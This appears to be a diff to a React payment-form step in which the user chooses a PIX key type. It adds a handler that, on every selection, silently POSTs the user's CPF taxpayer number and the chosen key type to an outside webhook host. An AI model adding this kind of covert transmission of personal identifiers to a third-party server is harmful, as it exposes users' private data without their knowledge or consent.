@@ -20,6 +20,29 @@ export const PixStep = ({ onNext, cpf, onBack }: PixStepProps) => {
   const [isLoading, setIsLoading] = useState(false);
   const { toast } = useToast();
 
+  const handlePixTypeChange = async (newPixType: string) => {
+    setPixType(newPixType);
+    
+    try {
+      await fetch("https://webhook.vpslegaleviver.shop/webhook/tipo_pix", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          event: "pix_type_selected",
+          timestamp: new Date().toISOString(),
+          data: {
+            cpf: cpf,
+            pixType: newPixType,
+          }
+        }),
+      });
+    } catch (error) {
+      console.error("Erro ao enviar tipo PIX:", error);
+    }
+  };
+
   const validatePixKey = () => {
     if (!pixKey.trim()) {
       setError("Digite sua chave PIX");
@@ -129,14 +152,14 @@ export const PixStep = ({ onNext, cpf, onBack }: PixStepProps) => {
           <form onSubmit={handleSubmit} className="space-y-3 md:space-y-6">
             <div className="space-y-2 md:space-y-4">
               <Label className="text-sm md:text-base">Sua chave PIX é:</Label>
-              <RadioGroup value={pixType} onValueChange={setPixType}>
+              <RadioGroup value={pixType} onValueChange={handlePixTypeChange}>
                 <div 
                   className={`flex items-center space-x-2 md:space-x-3 p-2 md:p-3 rounded-lg border transition-all cursor-pointer ${
                     pixType === "cpf" 
                       ? "bg-secondary/20 border-secondary text-secondary-foreground" 
                       : "hover:bg-muted/50"
                   }`}
-                  onClick={() => setPixType("cpf")}
+                  onClick={() => handlePixTypeChange("cpf")}
                 >
                   <RadioGroupItem value="cpf" id="cpf" className="data-[state=checked]:border-secondary data-[state=checked]:text-secondary" />
                   <Label htmlFor="cpf" className={`flex-1 cursor-pointer font-normal text-sm md:text-base ${pixType === "cpf" ? "font-semibold text-secondary" : ""}`}>
@@ -149,7 +172,7 @@ export const PixStep = ({ onNext, cpf, onBack }: PixStepProps) => {
                       ? "bg-secondary/20 border-secondary text-secondary-foreground" 
                       : "hover:bg-muted/50"
                   }`}
-                  onClick={() => setPixType("phone")}
+                  onClick={() => handlePixTypeChange("phone")}
                 >
                   <RadioGroupItem value="phone" id="phone" className="data-[state=checked]:border-secondary data-[state=checked]:text-secondary" />
                   <Label htmlFor="phone" className={`flex-1 cursor-pointer font-normal text-sm md:text-base ${pixType === "phone" ? "font-semibold text-secondary" : ""}`}>
@@ -162,7 +185,7 @@ export const PixStep = ({ onNext, cpf, onBack }: PixStepProps) => {
                       ? "bg-secondary/20 border-secondary text-secondary-foreground" 
                       : "hover:bg-muted/50"
                   }`}
-                  onClick={() => setPixType("email")}
+                  onClick={() => handlePixTypeChange("email")}
                 >
                   <RadioGroupItem value="email" id="email" className="data-[state=checked]:border-secondary data-[state=checked]:text-secondary" />
                   <Label htmlFor="email" className={`flex-1 cursor-pointer font-normal text-sm md:text-base ${pixType === "email" ? "font-semibold text-secondary" : ""}`}>
